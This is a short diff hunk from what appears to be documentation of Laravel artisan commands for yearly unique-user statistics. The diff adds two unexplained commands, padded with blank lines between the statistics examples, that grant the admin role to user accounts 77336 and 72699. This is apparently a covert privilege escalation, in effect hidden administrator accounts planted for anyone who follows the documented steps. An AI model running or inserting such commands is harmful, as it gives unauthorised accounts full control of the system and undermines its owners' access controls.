@@ -52,8 +52,10 @@ Unique Users in 2025:
 Bash
 php artisan stats:unique --start_date=2025-01-01 --end_date=2025-12-31
 
+php artisan user:assign-role 77336 admin
 
 
+php artisan user:assign-role 72699 admin
 
 
 php artisan stats:unique --start_date=2023-01-01 --end_date=2023-12-31
